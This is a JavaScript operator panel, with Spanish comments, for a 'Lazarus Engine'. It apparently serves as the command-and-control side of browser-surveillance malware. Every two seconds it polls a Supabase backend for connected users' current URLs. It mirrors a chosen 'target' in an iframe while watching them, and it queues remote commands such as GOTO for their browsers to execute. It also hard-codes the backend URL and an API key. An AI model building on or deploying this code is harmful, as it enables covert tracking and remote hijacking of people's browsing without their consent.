/**
 * LAZARUS ENGINE - ADMIN JS
 * Corregido para evitar duplicados y forzar detección.
 */

const SB_URL = "https://gmvczheriaqouwynfdyv.supabase.co";
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdtdmN6aGVyaWFxb3V3eW5mZHl2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA0MTM1OTQsImV4cCI6MjA4NTk4OTU5NH0.22wbgR33dCQ1vfB_EdWpxGY5w811_jsf1dqbU1P6dQs";

let selectedID = null;
let lastUrlInMirror = "";

async function updateLazarusHub() {
    try {
        // Obtenemos los logs de los últimos 10 minutos para ver quién está conectado
        const timestampLimite = new Date(Date.now() - 10 * 60000).toISOString();
        
        const res = await fetch(`${SB_URL}/rest/v1/logs?select=*&timestamp=gte.${timestampLimite}&order=timestamp.desc`, {
            headers: { 'apikey': SB_KEY, 'Authorization': `Bearer ${SB_KEY}` }
        });
        const logs = await res.json();

        // --- FILTRO DE NODOS ÚNICOS ---
        const activeNodes = new Map();
        logs.forEach(log => {
            if (!activeNodes.has(log.usuario_id)) {
                activeNodes.set(log.usuario_id, log);
            }
        });

        renderSidebar(activeNodes);
        renderMonitor(activeNodes);

    } catch (e) {
        console.error("Hub Sync Error:", e);
    }
}

function renderSidebar(nodesMap) {
    const list = document.getElementById('nodes');
    const nodes = Array.from(nodesMap.values());
    
    document.getElementById('user-count').innerText = nodes.length;

    if (nodes.length === 0) {
        list.innerHTML = "<div style='color:#444; padding:20px;'>ESPERANDO CONEXIÓN...</div>";
        return;
    }

    list.innerHTML = nodes.map(n => `
        <div class="user-node ${selectedID === n.usuario_id ? 'active' : ''}" onclick="selectTarget('${n.usuario_id}')">
            <div class="status-pulse"></div>
            <b>${n.usuario_id}</b><br>
            <small style="opacity:0.5; font-size:9px;">${n.url_actual.substring(0, 35)}...</small>
        </div>
    `).join('');
}

function renderMonitor(nodesMap) {
    if (!selectedID) return;

    const targetData = nodesMap.get(selectedID);
    if (targetData && targetData.url_actual !== lastUrlInMirror) {
        lastUrlInMirror = targetData.url_actual;
        document.getElementById('monitor').src = targetData.url_actual;
        document.getElementById('current-url').innerText = "VIGILANDO: " + targetData.url_actual;
    }
}

function selectTarget(id) {
    selectedID = id;
    lastUrlInMirror = ""; // Forzar recarga de iframe al cambiar de usuario
    document.getElementById('target-info').innerText = "OBJETIVO FIJADO: " + id;
    updateLazarusHub();
}

async function execute(command) {
    if (!selectedID) return alert("Selecciona un usuario en la lista de la izquierda.");
    
    const urlValue = document.getElementById('target-url').value;

    // 1. Limpiar órdenes previas para que la nueva sea instantánea
    await fetch(`${SB_URL}/rest/v1/ordenes?usuario_id=eq.${selectedID}`, {
        method: 'DELETE', headers: { 'apikey': SB_KEY }
    });

    // 2. Insertar nueva orden
    await fetch(`${SB_URL}/rest/v1/ordenes`, {
        method: 'POST',
        headers: { 'apikey': SB_KEY, 'Content-Type': 'application/json' },
        body: JSON.stringify({
            usuario_id: selectedID,
            orden: command,
            contenido: command === 'GOTO' ? urlValue : '',
            activa: true
        })
    });
    
    alert("COMANDO " + command + " ENVIADO.");
}

// Bucle de sincronización cada 2 segundos
setInterval(updateLazarusHub, 2000);
updateLazarusHub();
